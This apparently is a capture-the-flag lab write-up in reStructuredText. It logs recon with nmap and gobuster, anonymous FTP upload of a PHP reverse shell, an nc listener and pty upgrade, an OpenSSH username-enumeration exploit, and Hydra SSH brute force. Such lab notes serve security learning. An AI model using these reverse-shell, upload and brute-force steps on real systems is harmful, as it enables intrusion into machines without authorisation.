Startup
#######
:Author: David Boyd
:Date: 2020-11-09

What's Worked Thus Far
**********************

.. code-block:: Bash

	###
	### PHP Reverse Shell
	###
	## NOTE: user=www-data,pass=none,group=worthless

	# Get PHP reverse shell to local dir & edit LHOST,PORT
	sudo apt install webshells
	cp /usr/shell/webshells/php/php-reverse-shell.php ./
	vim php-reverse-shell.php

	# Upload to $TM using ftp
	ftp -p ...
	put files/ftp/php-reverse-shell.php

	# Set up listener on $LHOST
	nc -l 1234
	# Invoke shell
	w3m $TM/files/ftp/php-reverse-shell.php

	# [OPTIONAL] Escaping Limited Interpreter
	python -c 'import pty;pty.spawn("/bash/bin")'

	###
	### Capture the flag (1)
	###
	ls -al
	cat recipes.txt

What To Work On
***************

	- user:lennie
	- method:ssh
	- file:public key, password

Reconnaissance
**************

User data:

+-----------------+---------------+----------+-------------------------+-------------------+
| username        | email         | password | source                  | etc               |
+=================+===============+==========+=========================+===================+
| lennie          |               |          | php-rv-shell: ls /home/ | Guarnateed a User |
+-----------------+---------------+----------+-------------------------+-------------------+
| Maya            |               |          | $TM/files/notice.txt    |                   |
+-----------------+---------------+----------+-------------------------+-------------------+
| X->Kevin Hughes | kevin@iet.com |          | $TM/icons/blank.gif     | RED HERRING       |
+-----------------+---------------+----------+-------------------------+-------------------+

Network data:

+------+---------+-----------+------------+------------+
| port | service | creds     | completion | info       |
+======+=========+===========+============+============+
| 21   | ftp     | anonymous | successful | notice.txt |
+------+---------+-----------+------------+------------+

- Apache/2.4.18 (Ubuntu) Server at $TM Port 80 | $TM/files/

Commands
********

Basic
=====

.. code-block:: Bash

	# Discovery
	sudo nmap -T5 -A -sS $TM
	sudo nmap --script=http-enum -sV -Pn $TM
	gobuster dir -u $TM -w /usr/share/wordlists/dirbuster/...small.txt

	# Determine if there are any vulnerabilities
	searchsploit vsftpd
		> nothing useful for verson 3.0.3
	searchsploit apache
		> Apache 2.4.17 < 2.4.38 - 'apache2ctl graceful' 'logrotate' Lo | linux/local/46676.php
	searchsploit openssh 7.2p2
		> linux/remote/40136	# Username enumeration

FTP
===

.. code-block:: Bash

	# Begin FTP in PASV (Passive Mode)
	ftp -p
		(username) anonymous
		Password: <blank>

	# ftp commands
	get notice.txt							# works... I can download!
	send apache2ctl_46676.php				# !=work
	put <localFile> ftp/<remoteFile>		# works... I can upload!

Red Herrings
************

Username Enumeration - 40136.py
===============================

This is a Python2 script
	- dependencies: paramiko, numpy

.. code-block:: Bash

	# Install dependencies
	pip2 install paramiko numpy

	# run program
	python2 40136.py $TM -U \
	/usr/share/wordlists/SecLists/Usernames/Names/familynames-usa-top1000.txt
		> [+] WILSON
		> [+] HARRIS
		> [+] ALLEN
		> [+] ...
		...

Hydra - ssh
===========
:Note: Nothing came out of it

.. code-block:: Bash

	hydra -L ssh-usernames.out -P /usr/share/wordlists/rockyou.txt \
	$TM ssh -t 4 -I

